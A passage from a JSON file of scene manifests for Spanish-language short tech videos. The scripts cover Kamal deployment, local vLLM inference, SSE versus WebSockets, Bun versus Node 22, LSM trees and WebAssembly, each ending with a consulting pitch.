    "label": "Var A (Técnico): Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes",
    "variation": "A (Técnico)",
    "category": "INFRAESTRUCTURA & CLOUD COSTS",
    "manifest": {
      "title": "[10] Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes (Var A)",
      "category": "INFRAESTRUCTURA & CLOUD COSTS",
      "slug": "10_exodo_bare_metal_kamal",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "kamal_flow_hook",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "¿Cómo desplegar con cero tiempo de inactividad sin la pesadilla de Kubernetes? Kamal levanta el nuevo contenedor, valida la salud y conmuta el tráfico en milisegundos.",
          "visual_cue": "Apertura directa con arquitectura de conmutación de tráfico con proxy",
          "props": {
            "header": "MECANISMO DE DESPLIEGUE",
            "title": "ROLLING RESTART CON TRAEFIK",
            "nodes": [
              {
                "id": "proxy",
                "label": "TRAEFIK PROXY REVERSE",
                "sublabel": "Manejo automático de certificados SSL y rutas",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "app_new",
                "label": "NUEVO CONTENEDOR (V2)",
                "sublabel": "Health check verificado en localhost:8001",
                "color": "#10b981",
                "y": 520
              },
              {
                "id": "app_old",
                "label": "CONTENEDOR ANTIGUO (V1)",
                "sublabel": "Drenado suave de conexiones activas",
                "color": "#71717a",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "kamal_deploy",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Todo se configura en un simple archivo YAML. Un comando en tu terminal y tu aplicación queda en producción en tus propios servidores.",
          "visual_cue": "Terminal ejecutando kamal deploy con salida de docker tags",
          "props": {
            "header": "CONFIGURACIÓN DECLARATIVA",
            "title": "DEPLOY CON UN SOLO COMANDO",
            "filename": "config/deploy.yml",
            "codeLines": [
              "service: api-core",
              "image: registry.gitlab.com/app/api",
              "servers:",
              "  web:",
              "    - 159.69.10.42 # Servidor Hetzner $40/mo",
              "kamal deploy # Completado en 24 segundos con 0s downtime"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "cta_kamal",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu empresa quema dinero en AWS y quieres migrar a una infraestructura simple en servidores dedicados, te asesoro en el proceso. Link en mi perfil.",
          "visual_cue": "Cierre con auditoría y migración cloud",
          "props": {
            "header": "MIGRACIÓN & AUDITORÍA CLOUD",
            "title": "REDUCE FACTURA HASTA UN 80%",
            "cta": {
              "badge": "AUDITORÍA CLOUD (Link en bio)",
              "text": "¿Facturas absurdas en AWS o GCP? Agenda una sesión de migración en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "10_B",
    "topicNum": "10",
    "group": "10. EXODO BARE METAL KAMAL",
    "label": "Var B (Polémico): De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner",
    "variation": "B (Polémico)",
    "category": "INFRAESTRUCTURA & CLOUD COSTS",
    "manifest": {
      "title": "[10] De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner (Var B)",
      "category": "INFRAESTRUCTURA & CLOUD COSTS",
      "slug": "10_exodo_bare_metal_kamal",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hetzner_split_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Empresas como 37signals abandonaron la nube pública y pasaron de pagar cientos de miles de dólares a una fracción en servidores dedicados.",
          "visual_cue": "Apertura directa con terminal comparando factura mensual de AWS frente a servidor dedicado",
          "props": {
            "header": "COMPARATIVA DE HARDWARE Y COSTES",
            "title": "VIRTUALIZACIÓN AWS VS SERVIDOR FÍSICO HETZNER",
            "termA": {
              "title": "AWS CLOUD (EKS + RDS + NAT)",
              "color": "#ef4444",
              "cmd": "aws billing get-monthly-forecast",
              "status": "Facturación por cada gigabyte transferido",
              "time": "$14,800/mes",
              "lines": [
                "CPU compartida con vecinos ruidosos",
                "Coste por transferencia de datos: $0.09 por GB",
                "Complejidad: 40 servicios conectados en consola"
              ]
            },
            "termB": {
              "title": "HETZNER DEDICATED SERVER",
              "color": "#10b981",
              "cmd": "lscpu && free -h",
              "status": "AMD EPYC 32 Cores · 128GB DDR5 RAM · 2x 2TB NVMe",
              "time": "$190/mes",
              "lines": [
                "100% de la CPU física dedicada a tu app",
                "Tráfico ilimitado a 1 Gbps incluido",
                "Despliegues sencillos con Docker y Kamal"
              ]
            }
          }
        },
        {
          "id": "cta_kamal_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño planes de migración a bare-metal para recortar costes y multiplicar la velocidad de tu backend. Hablemos en el enlace de mi perfil.",
          "visual_cue": "Cierre con auditoría de infraestructura",
          "props": {
            "header": "PLAN DE MIGRACIÓN BARE-METAL",
            "title": "AHORRA MILES DE DÓLARES EN INFRAESTRUCTURA",
            "cta": {
              "badge": "AUDITORÍA DE COSTES (Link en perfil)",
              "text": "¿Listo para salir de la trampa de costes de la nube? Link en mi perfil para agendar tu plan."
            }
          }
        }
      ]
    }
  },
  {
    "key": "11_A",
    "topicNum": "11",
    "group": "11. MODELOS LOCALES VLLM",
    "label": "Var A (Técnico): Cómo funciona la cuantización a 4 bits: GGUF sin perder inteligencia",
    "variation": "A (Técnico)",
    "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
    "manifest": {
      "title": "[11] Cómo funciona la cuantización a 4 bits: GGUF sin perder inteligencia (Var A)",
      "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
      "slug": "11_modelos_locales_vllm",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "quant_memory_hook",
          "type": "memory_layout",
          "duration": 6.5,
          "voiceover": "¿Cómo comprimir un modelo de inteligencia artificial de treinta gigabytes para que corra en tu servidor local? Pasando de coma flotante a enteros de cuatro bits con cuantización.",
          "visual_cue": "Apertura directa con layout de memoria comparando FP16 (2 bytes) vs INT4 (0.5 bytes)",
          "props": {
            "header": "REDUCCIÓN DE HUELLA EN VRAM",
            "title": "FP16 VS CUANTIZACIÓN INT4",
            "items": [
              {
                "name": "PESOS ORIGINALES (FP16)",
                "addr": "16 BITS POR PESO",
                "value": "Requiere 32GB VRAM · Servidor de alto coste",
                "color": "#ef4444"
              },
              {
                "name": "PESOS CUANTIZADOS (INT4)",
                "addr": "4 BITS POR PESO",
                "value": "Solo 8GB VRAM · Corre en hardware estándar",
                "color": "#10b981"
              }
            ]
          }
        },
        {
          "id": "vllm_speed",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "Con motores como vLLM y PagedAttention, el servidor procesa peticiones en lotes continuos multiplicando la velocidad de inferencia.",
          "visual_cue": "Terminal levantando vLLM con modelo cuantizado",
          "props": {
            "header": "INFERENCIA DE ALTO RENDIMIENTO",
            "title": "VLLM CON PAGEDATTENTION",
            "filename": "deploy/vllm.sh",
            "codeLines": [
              "vllm serve Qwen2.5-Coder-32B-Instruct-AWQ \\",
              "  --gpu-memory-utilization 0.95 \\",
              "  --max-model-len 32768 \\",
              "  --port 8000",
              "# Rendimiento: 120 tokens/s con 40 usuarios concurrentes"
            ],
            "cursorLine": 5
          }
        },
        {
          "id": "cta_quant",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Ayudo a empresas a desplegar clústeres de inferencia privada con modelos abiertos para no depender de APIs externas. Contáctame en mi perfil.",
          "visual_cue": "Cierre con consultoría de IA privada",
          "props": {
            "header": "CONSULTORÍA DE IA PRIVADA",
            "title": "SOBERANÍA TOTAL DE TUS MODELOS",
            "cta": {
              "badge": "INGENIERÍA DE IA (Link en bio)",
              "text": "¿Quieres correr modelos locales sin pagar APIs caras? Link en mi bio para agendar una sesión."
            }
          }
        }
      ]
    }
  },
  {
    "key": "11_B",
    "topicNum": "11",
    "group": "11. MODELOS LOCALES VLLM",
    "label": "Var B (Polémico): Soberanía de Datos: Corre 100 tokens/s en local sin pagar APIs",
    "variation": "B (Polémico)",
    "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
    "manifest": {
      "title": "[11] Soberanía de Datos: Corre 100 tokens/s en local sin pagar APIs (Var B)",
      "category": "AI INFRASTRUCTURE & OPEN WEIGHTS",
      "slug": "11_modelos_locales_vllm",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "api_split_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Pagar tokens por cada petición a OpenAI está arruinando tus márgenes y exponiendo los datos privados de tus clientes.",
          "visual_cue": "Apertura directa con terminal comparando coste de API propietaria vs inferencia local",
          "props": {
            "header": "ANÁLISIS FINANCIERO",
            "title": "APIS PROPIETARIAS VS HARDWARE PROPIO",
            "termA": {
              "title": "APIS PROPIETARIAS EN LA NUBE",
              "color": "#ef4444",
              "cmd": "api.openai.com/v1/chat/completions",
              "status": "Factura escalando sin control",
              "time": "$6,200/mes",
              "lines": [
                "Pagas por cada prompt y cada respuesta",
                "Riesgo de rate limits y caídas imprevistas",
                "Tus datos sensibles viajan a servidores de terceros"
              ]
            },
            "termB": {
              "title": "SERVIDOR DE INFERENCIA VLLM",
              "color": "#10b981",
              "cmd": "localhost:8000/v1/chat/completions",
              "status": "Tarifa plana de servidor con 2x RTX 4090",
              "time": "$320/mes",
              "lines": [
                "Inferencia ilimitada las 24 horas del día",
                "Latencia local de 15ms sin salir de tu VPC",
                "Cumplimiento estricto de privacidad GDPR y HIPAA"
              ]
            }
          }
        },
        {
          "id": "cta_quant_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño e implemento infraestructura de IA on-premise y clústeres vLLM para empresas. Agenda tu diagnóstico en mi perfil.",
          "visual_cue": "Cierre con consultoría de IA privada",
          "props": {
            "header": "CONSULTORÍA DE IA ON-PREMISE",
            "title": "INFRAESTRUCTURA PRIVADA DE INFERENCIA",
            "cta": {
              "badge": "CONSULTORÍA DE IA (Contacto en bio)",
              "text": "Recorta costes de API y asegura la privacidad de tus datos. Link en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "12_A",
    "topicNum": "12",
    "group": "12. SSE VS WEBSOCKETS",
    "label": "Var A (Técnico): Por qué Server-Sent Events es superior a WebSockets en HTTP/2",
    "variation": "A (Técnico)",
    "category": "REDES & PROTOCOLOS WEB",
    "manifest": {
      "title": "[12] Por qué Server-Sent Events es superior a WebSockets en HTTP/2 (Var A)",
      "category": "REDES & PROTOCOLOS WEB",
      "slug": "12_sse_vs_websockets",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "sse_stream_hook",
          "type": "network_pipeline",
          "duration": 6.5,
          "voiceover": "¿Por qué toda la industria de IA usa Server-Sent Events en vez de WebSockets para streaming? Porque SSE viaja sobre HTTP estándar con multiplexación nativa.",
          "visual_cue": "Apertura directa con conexión HTTP/2 multiplexando múltiples streams",
          "props": {
            "header": "TRANSPORTE DE PROTOCOLO",
            "title": "MULTIPLEXACIÓN HTTP/2 NATIVA",
            "subtitle": "UN SOLO SOCKET TCP PARA CIENTOS DE STREAMS",
            "stages": [
              {
                "id": "client",
                "label": "BROWSER / EVENTSOURCE",
                "sub": "Reconexión automática nativa sin código extra",
                "y": 220,
                "color": "#38bdf8",
                "metric": "Nativo"
              },
              {
                "id": "edge",
                "label": "CLOUDFLARE / NGINX PROXY",
                "sub": "Manejo de caché y compresión estándar",
                "y": 520,
                "color": "#10b981",
                "metric": "Zero overhead"
              },
              {
                "id": "server",
                "label": "BACKEND NODE / RUST",
                "sub": "Content-Type: text/event-stream",
                "y": 820,
                "color": "#06b6d4",
                "metric": "Simple loop"
              }
            ]
          }
        },
        {
          "id": "sse_code",
          "type": "code_terminal",
          "duration": 6,
          "voiceover": "En el navegador no necesitas librerías pesadas. EventSource maneja reconexión automática si el usuario pierde la señal de red.",
          "visual_cue": "Terminal mostrando código limpio de EventSource en cliente y servidor",
          "props": {
            "header": "IMPLEMENTACIÓN LIMPIA",
            "title": "CLIENTE NATIVO EVENTSOURCE",
            "filename": "client/stream.ts",
            "codeLines": [
              "const es = new EventSource(\"/api/generate\");",
              "es.onmessage = (event) => {",
              "  terminal.append(event.data);",
              "};",
              "# Reconexión automática nativa mediante cabecera Last-Event-ID",
              "es.onerror = () => console.log(\"Reconectando...\");"
            ],
            "cursorLine": 4
          }
        },
        {
          "id": "cta_sse",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño arquitecturas backend en tiempo real y streaming de alta concurrencia. Si buscas un desarrollador senior para tu producto, link en mi bio.",
          "visual_cue": "Cierre con contratación senior backend",
          "props": {
            "header": "CONTRATACIÓN SENIOR BACKEND",
            "title": "SISTEMAS DISTRIBUIDOS Y TIEMPO REAL",
            "cta": {
              "badge": "SENIOR BACKEND ENGINEER (Link en bio)",
              "text": "¿Necesitas arquitectura de streaming robusta? Hablemos en el enlace de mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "12_B",
    "topicNum": "12",
    "group": "12. SSE VS WEBSOCKETS",
    "label": "Var B (Polémico): No compliques tu stack: Deja de usar WebSockets para simples streams",
    "variation": "B (Polémico)",
    "category": "REDES & PROTOCOLOS WEB",
    "manifest": {
      "title": "[12] No compliques tu stack: Deja de usar WebSockets para simples streams (Var B)",
      "category": "REDES & PROTOCOLOS WEB",
      "slug": "12_sse_vs_websockets",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "ws_tradeoff_hook",
          "type": "tradeoff_matrix",
          "duration": 6.5,
          "voiceover": "Usar WebSockets solo para mostrar texto progresivo o notificaciones complica tus balanceadores de carga sin ninguna necesidad técnica real.",
          "visual_cue": "Apertura directa con tabla comparativa de Server-Sent Events frente a WebSockets",
          "props": {
            "header": "CRITERIO DE SELECCIÓN",
            "title": "SERVER-SENT EVENTS VS WEBSOCKETS",
            "colA": "SERVER-SENT EVENTS (SSE)",
            "colB": "WEBSOCKETS (WS)",
            "rows": [
              {
                "dim": "Streaming de IA y feeds",
                "a": "✔ Perfecto y nativo",
                "b": "✖ Sobreingeniería",
                "aGood": true
              },
              {
                "dim": "Reconexión automática",
                "a": "✔ Manejada por browser",
                "b": "✖ Manual con código JS",
                "aGood": true
              },
              {
                "dim": "Compatibilidad con Proxies",
                "a": "✔ HTTP/2 estándar",
                "b": "✖ Requiere Upgrade HTTP",
                "aGood": true
              },
              {
                "dim": "Juegos online y Audio full-duplex",
                "a": "✖ Unidireccional",
                "b": "✔ Ideal para bidireccional",
                "aGood": false
              }
            ]
          }
        },
        {
          "id": "cta_sse_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de red de aplicaciones web para simplificar el stack y mejorar la fiabilidad. Agenda en el link de mi perfil.",
          "visual_cue": "Cierre con auditoría de arquitectura",
          "props": {
            "header": "AUDITORÍA DE ARQUITECTURA WEB",
            "title": "SIMPLIFICA TUS CONEXIONES DE RED",
            "cta": {
              "badge": "AUDITORÍA DE ARQUITECTURA (Link en perfil)",
              "text": "Elimina complejidad innecesaria en tu backend. Link en mi perfil para agendar tu revisión."
            }
          }
        }
      ]
    }
  },
  {
    "key": "13_A",
    "topicNum": "13",
    "group": "13. BUN VS NODE22",
    "label": "Var A (Técnico): V8 vs JavaScriptCore: Cómo Node 22 contraatacó con TypeScript nativo",
    "variation": "A (Técnico)",
    "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
    "manifest": {
      "title": "[13] V8 vs JavaScriptCore: Cómo Node 22 contraatacó con TypeScript nativo (Var A)",
      "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
      "slug": "13_bun_vs_node22",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "runtime_split_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "¿Cómo respondió Node.js ante la velocidad de Bun? Con ejecución nativa de TypeScript sin transpiladores externos en Node veintidós.",
          "visual_cue": "Apertura directa con terminal ejecutando TypeScript en ambos entornos sin dependencias",
          "props": {
            "header": "EJECUCIÓN DE TYPESCRIPT SIN BUILD",
            "title": "ZERO-COMPILATION TYPESCRIPT RUNNERS",
            "termA": {
              "title": "NODE.JS 22 (--experimental-strip-types)",
              "color": "#38bdf8",
              "cmd": "node --strip-types server.ts",
              "status": "Elimina tipos en memoria y corre en V8",
              "time": "0.12s cold start",
              "lines": [
                "Cero dependencias: Ni ts-node ni tsx requeridos",
                "Soporte nativo de módulo de SQLite (node:sqlite)",
                "Test runner nativo integrado con mock engine"
              ]
            },
            "termB": {
              "title": "BUN 1.2 (JAVASCRIPTCORE + ZIG)",
              "color": "#10b981",
              "cmd": "bun server.ts",
              "status": "Transpila y optimiza a código máquina",
              "time": "0.015s cold start",
              "lines": [
                "Arranque ultra rápido en 15 milisegundos",
                "Empaqueta a binario ejecutable único",
                "Syscalls de red hiperoptimizadas en Zig"
              ]
            }
          }
        },
        {
          "id": "cta_runtime",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito el rendimiento y la configuración de pipelines TypeScript para reducir tiempos de build y despliegue. Link en mi perfil.",
          "visual_cue": "Cierre con auditoría de performance en TypeScript",
          "props": {
            "header": "AUDITORÍA DE TOOLING Y PERFORMANCE",
            "title": "OPTIMIZA TU ENTORNO TYPESCRIPT",
            "cta": {
              "badge": "AUDITORÍA DE TOOLING (Link en bio)",
              "text": "¿Tus builds de TypeScript tardan demasiado? Link en mi perfil para optimizar tu stack."
            }
          }
        }
      ]
    }
  },
  {
    "key": "13_B",
    "topicNum": "13",
    "group": "13. BUN VS NODE22",
    "label": "Var B (Polémico): ¿Vale la pena migrar a Bun en producción o Node.js ya cerró la brecha?",
    "variation": "B (Polémico)",
    "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
    "manifest": {
      "title": "[13] ¿Vale la pena migrar a Bun en producción o Node.js ya cerró la brecha? (Var B)",
      "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
      "slug": "13_bun_vs_node22",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "impact_bun_hook",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Bun es increíblemente rápido en tu máquina de desarrollo, pero ¿es seguro migrar toda tu infraestructura de producción hoy mismo?",
          "visual_cue": "Tipografía de impacto gigante sin iconos repetitivos",
          "props": {
            "layout": "impact",
            "badge": "DECISIÓN DE PRODUCCIÓN",
            "lines": [
              {
                "text": "¿MIGRAR A BUN O",
                "color": "#ffffff"
              },
              {
                "text": "SEGUIR EN NODE 22?",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "Velocidad bruta frente a compatibilidad de paquetes"
          }
        },
        {
          "id": "tradeoff_bun_node",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Usa Bun como gestor de paquetes y ejecutor de tests para ganar diez veces más velocidad en CI/CD; evalúa con cuidado las librerías C++ nativas en el servidor.",
          "visual_cue": "Matriz de compatibilidad y recomendación de adopción gradual",
          "props": {
            "header": "ESTRATEGIA DE ADOPCIÓN",
            "title": "DÓNDE USAR CADA RUNTIME",
            "colA": "BUN (DESARROLLO Y CI)",
            "colB": "NODE 22 (PRODUCCIÓN CORE)",
            "rows": [
              {
                "dim": "Instalación de paquetes en CI",
                "a": "✔ 30x más rápido",
                "b": "✖ Lento en pipelines",
                "aGood": true
              },
              {
                "dim": "Ejecución de tests locales",
                "a": "✔ Resultados instantáneos",
                "b": "✖ Mayor consumo CPU",
                "aGood": true
              },
              {
                "dim": "Librerías legacy en C++ (Addons)",
                "a": "✖ Casos límite",
                "b": "✔ 100% compatible N-API",
                "aGood": false
              }
            ]
          }
        },
        {
          "id": "cta_runtime_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Ayudo a equipos de ingeniería a modernizar sus proyectos TypeScript sin romper producción. Contáctame en el enlace de mi perfil.",
          "visual_cue": "Cierre con consultoría de modernización",
          "props": {
            "header": "MODERNIZACIÓN DE ARQUITECTURA JS/TS",
            "title": "TRANSICIÓN SEGURA Y DE ALTO RENDIMIENTO",
            "cta": {
              "badge": "CONSULTORÍA SENIOR (Contacto en perfil)",
              "text": "Moderniza tu stack de JavaScript sin sorpresas. Agenda una sesión técnica en mi biografía."
            }
          }
        }
      ]
    }
  },
  {
    "key": "14_A",
    "topicNum": "14",
    "group": "14. LSM TREES VS BTREES",
    "label": "Var A (Técnico): LSM Trees vs B-Trees: MemTable, SSTables y páginas en disco",
    "variation": "A (Técnico)",
    "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
    "manifest": {
      "title": "[14] LSM Trees vs B-Trees: MemTable, SSTables y páginas en disco (Var A)",
      "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
      "slug": "14_lsm_trees_vs_btrees",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "lsm_flow_hook",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "¿Por qué RocksDB escribe a velocidades récord mientras Postgres prefiere B-Trees? Un LSM Tree escribe en una MemTable en RAM y luego vuelca bloques secuenciales inmutables en disco.",
          "visual_cue": "Apertura directa con arquitectura de escritura secuencial: MemTable a SSTables",
          "props": {
            "header": "FLUJO DE ESCRITURA EN LSM",
            "title": "ESCRITURAS SECUENCIALES INMUTABLES",
            "nodes": [
              {
                "id": "ram",
                "label": "MEMTABLE (SKIPLIST EN RAM)",
                "sublabel": "Escrituras directas O(1) en memoria DDR5",
                "color": "#10b981",
                "y": 160
              },
              {
                "id": "wal",
                "label": "APPEND-ONLY LOG EN NVMe",
                "sublabel": "Cero escrituras aleatorias · Máximo throughput",
                "color": "#fbbf24",
                "y": 520
              },
              {
                "id": "sst",
                "label": "SSTABLES INMUTABLES EN DISCO",
                "sublabel": "Compactación en segundo plano por niveles",
                "color": "#38bdf8",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "btree_diff",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "En cambio, un B-Tree sobrescribe páginas en ubicaciones aleatorias. Es más lento para escribir, pero sus lecturas son instantáneas con un solo salto.",
          "visual_cue": "Matriz técnica de compensaciones entre motores",
          "props": {
            "header": "COMPENSACIONES DE HARDWARE",
            "title": "LSM-TREE VS B-TREE",
            "colA": "LSM-TREE (ROCKSDB)",
            "colB": "B-TREE (POSTGRESQL)",
            "rows": [
              {
                "dim": "Velocidad de Escritura",
                "a": "✔ Ultra rápida (Append-only)",
                "b": "✖ Lenta (Random page writes)",
                "aGood": true
              },
              {
                "dim": "Velocidad de Lectura puntual",
                "a": "✖ Requiere Bloom Filters",
                "b": "✔ 1 solo seek O(log N)",
                "aGood": false
              },
              {
                "dim": "Amplificación de Escritura",
                "a": "Alta (Por compactación)",
                "b": "Baja (Páginas directas)",
                "aGood": false
              }
            ]
          }
        },
        {
          "id": "cta_lsm",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito motores de persistencia y diagnostico cuellos de botella de disco en sistemas con cargas masivas. Link en mi perfil.",
          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
          "props": {
            "header": "AUDITORÍA DE BASES DE DATOS Y I/O",
            "title": "RESOLUCIÓN DE CUELLOS DE BOTELLA",
            "cta": {
              "badge": "AUDITORÍA DE DATOS (Link en bio)",
              "text": "¿Tu base de datos sufre por escrituras masivas? Link en mi perfil para agendar tu auditoría."
            }
          }
        }
      ]
    }
  },
  {
    "key": "14_B",
    "topicNum": "14",
    "group": "14. LSM TREES VS BTREES",
    "label": "Var B (Polémico): ¿Por qué tu base colapsa en escrituras masivas? Postgres vs RocksDB",
    "variation": "B (Polémico)",
    "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
    "manifest": {
      "title": "[14] ¿Por qué tu base colapsa en escrituras masivas? Postgres vs RocksDB (Var B)",
      "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
      "slug": "14_lsm_trees_vs_btrees",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "iops_split_hook",
          "type": "terminal_split",
          "duration": 6.5,
          "voiceover": "Estás bombardeando PostgreSQL con eventos de analítica y tu disco colapsó por contención de páginas de B-Trees.",
          "visual_cue": "Apertura directa con terminal mostrando saturación de IOPS al 100% en disco",
          "props": {
            "header": "TELEMETRÍA DE DISCO",
            "title": "SATURACIÓN DE IOPS EN NVME",
            "termA": {
              "title": "POSTGRESQL INSERT MASIVO",
              "color": "#ef4444",
              "cmd": "iostat -xz 1",
              "status": "Disco al 99.8% de utilización · I/O Wait",
              "time": "Saturado",
              "lines": [
                "B-Tree lock contention en páginas de índices",
                "WAL flush bottleneck bloqueando hilos de workers",
                "Peticiones HTTP cayendo con error 504 Gateway Timeout"
              ]
            },
            "termB": {
              "title": "LSM / COLUMNAR ENGINE",
              "color": "#10b981",
              "cmd": "ingest_worker --batch=10000",
              "status": "Escrituras secuenciales sin bloqueos",
              "time": "Fluido",
              "lines": [
                "MemTable absorbe ráfagas de 150,000 req/s",
                "Utilización de disco por debajo del 25%",
                "Latencia de inserción estable en sub-milisegundos"
              ]
            }
          }
        },
        {
          "id": "cta_lsm_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de datos de tu producto para seleccionar el motor adecuado y evitar caídas en picos de tráfico. Enlace en mi bio.",
          "visual_cue": "Cierre con auditoría de datos",
          "props": {
            "header": "AUDITORÍA DE PERSISTENCIA Y LATENCIA",
            "title": "DISEÑO DE CAPA DE DATOS PARA ALTA CARGA",
            "cta": {
              "badge": "AUDITORÍA DE DATOS (Link en perfil)",
              "text": "Evita caídas por saturación de base de datos. Agenda tu auditoría técnica en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "15_A",
    "topicNum": "15",
    "group": "15. WEBASSEMBLY SERVIDOR",
    "label": "Var A (Técnico): Sandboxing matemático: Wasmtime y aislamiento de código",
    "variation": "A (Técnico)",
    "category": "RUNTIMES DE SERVIDOR & WASM",
    "manifest": {
      "title": "[15] Sandboxing matemático: Wasmtime y aislamiento de código (Var A)",
      "category": "RUNTIMES DE SERVIDOR & WASM",
      "slug": "15_webassembly_servidor",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "wasm_speed_hook",
          "type": "metrics_comparison",
          "duration": 6.5,
          "voiceover": "¿Cómo ejecutar código no confiable de usuarios a velocidad nativa sin riesgo de seguridad? Mientras un contenedor Docker tarda cientos de milisegundos en arrancar, una función WASM se inicializa en menos de un milisegundo.",
          "visual_cue": "Apertura directa con comparativa de cold start entre Docker y WebAssembly",
          "props": {
            "header": "COLD START EN EDGE COMPUTING",
            "metricA": {
              "label": "CONTENEDOR DOCKER LIGHT",
              "value": "450ms",
              "sub": "Namespace init y OverlayFS mount",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "WASM MICRO-RUNTIME",
              "value": "0.8ms",
              "sub": "Instanciación de memoria directa",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "wasm_memory",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "Un módulo WASI tiene una memoria lineal estrictamente delimitada. El programa no puede leer ni escribir ni un solo byte fuera de su espacio asignado.",
          "visual_cue": "Memoria lineal delimitada de WebAssembly",
          "props": {
            "header": "AISLAMIENTO MATEMÁTICO",
            "title": "MEMORIA LINEAL ENCAPSULADA",
            "items": [
              {
                "name": "ESPACIO DEL MÓDULO WASM",
                "addr": "0x0000 -> 0xFFFF",
                "value": "Memoria lineal aislada sin acceso a syscalls",
                "color": "#10b981"
              },
              {
                "name": "MEMORIA DEL KERNEL HOST",
                "addr": "BLOQUEADA",
                "value": "Protegida con guard pages por hardware",
                "color": "#ef4444"
              }
            ]
          }
        },
        {
          "id": "cta_wasm",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño arquitecturas seguras de ejecución de código y micro-runtimes aislados. Si necesitas un ingeniero especializado para tu sistema, link en mi bio.",
          "visual_cue": "Cierre con contratación senior",
          "props": {
            "header": "CONTRATACIÓN SENIOR / SISTEMAS",
            "title": "ARQUITECTURA DE RUNTIMES & EDGE COMPUTING",
            "cta": {
              "badge": "STAFF ENGINEER (Link en bio)",
              "text": "¿Necesitas ejecutar plugins o código aislado de forma segura? Hablemos en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "15_B",
    "topicNum": "15",
    "group": "15. WEBASSEMBLY SERVIDOR",
    "label": "Var B (Polémico): ¿Morirá Docker en el Edge? Arranques en 1 milisegundo con WASM",
    "variation": "B (Polémico)",
    "category": "RUNTIMES DE SERVIDOR & WASM",
    "manifest": {
      "title": "[15] ¿Morirá Docker en el Edge? Arranques en 1 milisegundo con WASM (Var B)",
      "category": "RUNTIMES DE SERVIDOR & WASM",
      "slug": "15_webassembly_servidor",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "docker_tradeoff_hook",
          "type": "tradeoff_matrix",
          "duration": 6.5,
          "voiceover": "El creador de Docker dijo que si WASM hubiera existido en 2008, no habrían tenido que crear Docker. Para funciones serverless en el edge, WASM es infinitamente superior.",
          "visual_cue": "Apertura directa con matriz comparativa Docker frente a WebAssembly",
          "props": {
            "header": "COMPARATIVA DE CONTENCIÓN",
            "title": "DOCKER CONTAINERS VS WEBASSEMBLY",
            "colA": "WEBASSEMBLY (WASI)",
            "colB": "DOCKER (OCI)",
            "rows": [
              {
                "dim": "Tiempo de arranque en frío",
                "a": "✔ < 1 milisegundo",
                "b": "✖ 300-800 milisegundos",
                "aGood": true
              },
              {
                "dim": "Tamaño del binario",
                "a": "✔ 2 a 10 Megabytes",
                "b": "✖ 150 a 500 Megabytes",
                "aGood": true
              },
              {
                "dim": "Soporte de apps monolíticas",
                "a": "✖ Requiere compilar a WASI",
                "b": "✔ Cualquier Linux binario",
                "aGood": false
              }
            ]
          }
        },
        {
          "id": "cta_wasm_b",
